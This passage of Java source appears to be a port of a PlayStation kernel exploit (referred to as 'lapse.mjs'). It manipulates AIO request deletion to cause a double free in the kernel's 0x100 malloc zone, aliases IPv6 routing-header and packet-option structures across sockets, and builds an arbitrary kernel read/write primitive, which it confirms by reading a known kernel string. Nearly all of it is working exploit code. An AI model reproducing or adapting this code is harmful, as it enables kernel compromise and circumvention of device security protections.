			// IPV6_RTHDR (routing header) options struct for setsockopt, build_rthdr in lapse.mjs
			// FIXME: Would be nice to have a BufferLike class that mirrors the rthdr structure
			final int RTHDR_LEN = ((MALLOC_SIZE >> 3) - 1) & ~1;
			final int RTHDR_SIZE = (RTHDR_LEN + 1) << 3;
			reqs2.putByte(0, (byte)0);                // ip6r_next
			reqs2.putByte(1, (byte)RTHDR_LEN);        // ip6r_len
			reqs2.putByte(2, (byte)0);                // ip6r_type
			reqs2.putByte(3, (byte)(RTHDR_LEN >> 1)); // ip6r_segleft

			// Construct an aio_batch at the end of the buffer
			final int REQS3_OFFSET = 0x28;
			Buffer reqs3 = new Buffer(reqs2.address() + REQS3_OFFSET, 0x80 - REQS3_OFFSET);

			// Aliasing SceAioRWRequest(?)
			// FIXME: Is this documented literally anywhere?
			reqs2.putInt(4, 5);                                   // ar2_ticket
			reqs2.putLong(0x18, inAioEntryAddr);                  // ar2_info
			reqs2.putLong(0x20, inKernelHeapAddr + REQS3_OFFSET); // ar2_batch

			// [.ar3_num_reqs, .ar3_reqs_left] aliases .ar2_spinfo
			// safe since free_queue_entry() doesn't deref the pointer
			reqs3.putInt(0, 1); // ar3_num_reqs(?)
			reqs3.putInt(4, 0); // ar3_reqs_left(?)
			// [.ar3_state, .ar3_done] aliases .ar2_result.returnValue
			reqs3.putInt(8, k.AIO_STATE_COMPLETED); // ar3_state
			reqs3.putByte(0xc, (byte)0);            // ar3_done
			// .ar3_lock aliases .ar2_qentry (rest of the buffer is padding)
			// safe since the entry already got dequeued
			// .ar3_lock.lock_object.lo_flags =
			//   LO_SLEEPABLE | LO_UPGRADABLE | LO_RECURSABLE | LO_DUPOK | LO_WITNESS |
			//   6 << LO_CLASSSHIFT | LO_INITIALIZED
			reqs3.putInt(0x28, 0x67b0000); // .ar3_lock.lock_object_lo_flags
			reqs3.putLong(0x38, 1);        // .ar3_lock.lk_lock = LK_UNLOCKED

			outSocket = null;
			AioSubmitIdArray reqId = null;
			for (int attempt = 0; attempt < NUM_ATTEMPTS; attempt++) {
				log("AliasAioRthdr: overwrite AIO queue entry with rthdr: attempt " + attempt);
				for (int i = 0; i < inoutSockets.length; i++) {
					inoutSockets[i].setRthdr(reqs2.slice(0, RTHDR_SIZE));
				}

				AioErrorArray states = k.new AioErrorArray(NUM_ELEMS);

				int aioIdx = -1;
				for (int i = 0; i < NUM_BATCHES; i++) {
					for (int j = 0; j < states.count; j++) {
						states.set(j, -1);
					}
					k.aioMultiCancel(ids.slice((i * NUM_ELEMS) << 2, NUM_ELEMS), null);
					int reqIdx = -1;
					for (int j = 0; j < states.count; j++) {
						if (states.get(j).get() == k.AIO_STATE_COMPLETED) {
							reqIdx = j;
							break;
						}
					}
					if (reqIdx == -1) {
						continue; // check next batch
					}
					log("-> found req_id " + reqIdx + " in batch " + i);
					aioIdx = i * NUM_ELEMS + reqIdx;
					break;
				}
				if (aioIdx == -1) {
					continue; // try again
				}

				reqId = k.new AioSubmitIdArray(1);
				reqId.set(0, ids.get(aioIdx).get());
				ids.set(aioIdx, 0); // keep it from getting deleted in the next step

				// set .ar3_done to 1
				k.aioMultiPoll(reqId, states);
				int rid = reqId.get(0).get(), rst = states.get(0).get();
				log("-> aio_multi_poll " + rid + " => 0x" + Integer.toHexString(rst));

				for (int i = 0; i < inoutSockets.length; i++) {
					Socket socket = inoutSockets[i];
					socket.getRthdr(reqs2);
					byte done = reqs2.getByte(REQS3_OFFSET + 0xc);
					if (done != 0) {
						log("-> read reqs2 via getsockopt on socket i=" + i + " fd=" + socket.fd);
						log(hexdump(reqs2, "-> "));
						outSocket = socket;
						inoutSockets[i] = k.new SocketUDP6();
						break;
					}
				}
				if (outSocket != null) {
					break;
				}
			}
			if (outSocket == null) {
				throw new Exception("Couldn't find sd that overwrote AIO queue entry");
			}

			k.aioUtilBatchCancelPollDelete(ids); // delete everything except reqId

			// Enable deletion of targetId from last step
			AioErrorArray state = k.new AioErrorArray(1);
			k.aioMultiPoll(inAioTargetId, state);
			log("-> target_id state: " + state.get(0));

			AioErrorArray errors = k.new AioErrorArray(2);
			AioSubmitIdArray targetIds = k.new AioSubmitIdArray(2);
			targetIds.set(0, reqId.get(0).get());
			targetIds.set(1, inAioTargetId.get(0).get());

			// PANIC: double free on the 0x100 malloc zone. important kernel data may alias
			log("-> aio_multi_delete req_id " + targetIds.get(0) + " target_id " + targetIds.get(1));
			k.aioMultiDelete(targetIds, errors);

			// We reclaim first since the sanity checking here is longer which makes it more likely
			// that we have another process claim the memory
			// lapse.mjs calls this block make_aliased_pktopts
			// RESTORE: double freed memory has been reclaimed with harmless data
			// PANIC: 0x100 malloc zone pointers aliased

			// NOTE: Probably shouldn't log anything here since we're in a PANIC state?
			enableLogging = false;

			int NUM_PKTOPT_ALIAS_ATTEMPTS = 50; // FIXME: 10 in lapse.mjs
			Socket sockets[] = inoutSockets;
			for (int attempt = 0; attempt < NUM_PKTOPT_ALIAS_ATTEMPTS; attempt++) {
				log("-> make_aliased_pktopts attempt " + attempt);
				for (int i = 0; i < sockets.length; i++) {
					if (sockets[i] == null) continue;
					sockets[i].setOption(k.IPPROTO_IPV6, k.IPV6_2292PKTOPTIONS, new Buffer(0, 0));
				}
				Buffer tclass = new Buffer(4);
				for (int i = 0; i < sockets.length; i++) {
					if (sockets[i] == null) continue;
					tclass.putInt(0, i); // marker
					sockets[i].setOption(k.IPPROTO_IPV6, k.IPV6_TCLASS, tclass);
				}
				for (int i = 0; i < sockets.length; i++) {
					if (sockets[i] == null) continue;
					sockets[i].getOption(k.IPPROTO_IPV6, k.IPV6_TCLASS, tclass);
					int m = tclass.getInt(0); // marker
					if (m != i) {
						outSocketA = sockets[i]; sockets[i] = k.new SocketUDP6();
						outSocketB = sockets[m]; sockets[m] = k.new SocketUDP6();
						enableLogging = true; // ehhh...
						log("-> found pair with fds " + outSocketA.fd + "/" + outSocketB.fd);
						break;
					}
				}
				if (outSocketA != null) {
					break;
				}
			}

			enableLogging = true;
			log("-> aio_multi_delete errors: " + errors);

			AioErrorArray states = k.new AioErrorArray(2);
			k.aioMultiPoll(targetIds, states);
			log("-> target_id states: " + states);

			if (states.get(0).get() != k.SCE_KERNEL_ERROR_ESRCH) {
				throw new Exception("Bad delete of corrupt AIO request");
			}

			if (errors.get(0).get() != 0 || errors.get(0).get() != errors.get(1).get()) {
				throw new Exception("Bad delete of ID pair");
			}

			if (outSocketA == null) {
				throw new Exception("Couldn't find aliasing pktopt pair");
			}
		}
	}

	private class MakeKernelRW extends Phase {
		/** Sockets array that every step reuses, sds in lapse.mjs */
		public Socket inoutSockets[];

		/** Socket whose rthdr pointer is corrupt, dirty_sd in lapse.mjs */
		public Socket inDirtySocket;

		/** pktopts_sds[0] in lapse.mjs */
		public Socket inSocketA;

		/** pktopts_sds[1] in lapse.mjs */
		public Socket inSocketB;

		/** Double freed 0x100 malloc zone address, k100_addr in lapse.mjs */
		public long inAioEntryAddr;

		/** Address of the "evf cv" string, kernel_addr in lapse.mjs */
		public long inKernelImageAddr;

		public void run() throws Throwable {
			log("MakeKernelRW: constructing arbitrary kernel read/write primitive");

			Socket psd = inSocketA;

			Buffer tclass = new Buffer(4);
			final int TCLASS_OFFSET = 0xb0; // would be 0xc0 for PS5

			final int MALLOC_SIZE = 0x100;
			Buffer pktopts = new Buffer(MALLOC_SIZE);

			// IPV6_RTHDR (routing header) options struct for setsockopt, build_rthdr in lapse.mjs
			// FIXME: Would be nice to have a BufferLike class that mirrors the rthdr structure
			final int RTHDR_LEN = ((MALLOC_SIZE >> 3) - 1) & ~1;
			final int RTHDR_SIZE = (RTHDR_LEN + 1) << 3;
			pktopts.putByte(0, (byte)0);                // ip6r_next
			pktopts.putByte(1, (byte)RTHDR_LEN);        // ip6r_len
			pktopts.putByte(2, (byte)0);                // ip6r_type
			pktopts.putByte(3, (byte)(RTHDR_LEN >> 1)); // ip6r_segleft

			long pktinfoAddr = inKernelImageAddr + 0x10;
			pktopts.putLong(0x10, pktinfoAddr); // pktopts.ip6po_pktinfo = &pktopts.ip6po_pktinfo

			log("-> overwrite main pktopts");
			Socket reclaimSocket = null;
			inSocketB.close();

			final int NUM_ATTEMPTS = 50; // 10 in lapse.mjs, num_alias
			for (int attempt = 0; attempt < NUM_ATTEMPTS; attempt++) {
				for (int i = 0; i < inoutSockets.length; i++) {
					// if a socket doesn't have a pktopts, setting the rthdr will make
					// one. the new pktopts might reuse the memory instead of the
					// rthdr. make sure the sockets already have a pktopts before
					pktopts.putInt(TCLASS_OFFSET, 0x4141 | (i << 16)); // marker
					inoutSockets[i].setRthdr(pktopts.slice(0, RTHDR_SIZE));
				}
				psd.getOption(k.IPPROTO_IPV6, k.IPV6_TCLASS, tclass);
				int m = tclass.getInt(0); // marker
				if ((m & 0xffff) == 0x4141) {
					log("-> found marker on attempt " + attempt);
					int idx = m >> 16;
					reclaimSocket = inoutSockets[idx];
					inoutSockets[idx] = k.new SocketUDP6(); // FIXME: maybe unsafe?
					break;
				}
			}
			if (reclaimSocket == null) {
				throw new Exception("Failed to overwrite main pktopts");
			}

			log("-> constructing kernel arbitrary read/write primitive");
			KernelRW krw = new KernelRW(k, psd, pktinfoAddr);

			// Try to read the "evf cv" string from kernel memory
			long evfCvQword = krw.read64(inKernelImageAddr);
			String evfCv = api.readString(krw.read.address(), 8);
			log("-> read from kernel memory: 0x" + Console.hex(evfCvQword) + " '" + evfCv + "'");

			if (!evfCv.equals("evf cv")) {
				throw new Exception("Kernel arbitrary read/write doesn't work");
			}
		}
	}

	/** Arbitrary kernel read/write primitive instantiated by MakeKernelRW */
	public static class KernelRW {
		private LibKernel k;
		private Buffer pktinfo = new Buffer(0x14);
		private Socket psd;
		private Buffer nhop = new Buffer(4);

		/** Buffer containing the last qword read with read64
		 * FIXME: Only exposed because we have no read8 primitive yet */
		public Buffer read = new Buffer(8);

		public KernelRW(LibKernel k, Socket psd, long pktinfoAddr) {
			this.k = k;
			this.psd = psd;
			this.pktinfo.putLong(0, pktinfoAddr);
		}

		public long read64(long addr) {
			final int LEN = 8;
			for (int offset = 0; offset < LEN;) {
				pktinfo.putLong(8, addr + offset); // pktopts.ip6po_nhinfo = addr + offset
				nhop.putByte(0, (byte)(LEN - offset));
				psd.setOption(k.IPPROTO_IPV6, k.IPV6_PKTINFO, pktinfo);
				// FIXME: Make setOption support this usecase
				long raddr = read.address() + offset;
				long rplen = nhop.address();
				k.SYS_getsockopt.call(psd.fd, k.IPPROTO_IPV6, k.IPV6_NEXTHOP, raddr, rplen);
				int n = nhop.getInt(0); // bytes actually written(?)
				if (n == 0) {
					read.putByte(offset, (byte)0); // in case read fails(?)
					offset += 1;
				} else {
					offset += n;
				}
			}
			return read.getLong(0);
		}
	}

	public String hexdump(Buffer buf, String indent) {
		final int BYTES_PER_LINE = 32;
		long lastLineAddr = Math.max(BYTES_PER_LINE, buf.address() + buf.size());
		int lastLineAddrWidth = Long.toHexString(lastLineAddr).length();
		StringBuffer sb = new StringBuffer();
		for (long i = buf.address(); i < buf.address() + buf.size(); i += BYTES_PER_LINE) {
			sb.append(indent);
			sb.append("0x");
			sb.append(leftpad(Long.toHexString(i), '0', lastLineAddrWidth));
			sb.append(": ");
			for (long j = 0; j < BYTES_PER_LINE; j++) {
				byte b = api.read8(i + j);
				sb.append(Character.forDigit((b & 0xF0) >> 8, 16));
				sb.append(Character.forDigit((b & 0x0F) >> 0, 16));
				sb.append(' ');
			}
			sb.append('\n');
		}
		return sb.toString();
	}

	public String leftpad(String str, char fill, int width) {
		while (str.length() < width) {
			str = fill + str;
		}
		return str;
	}
}
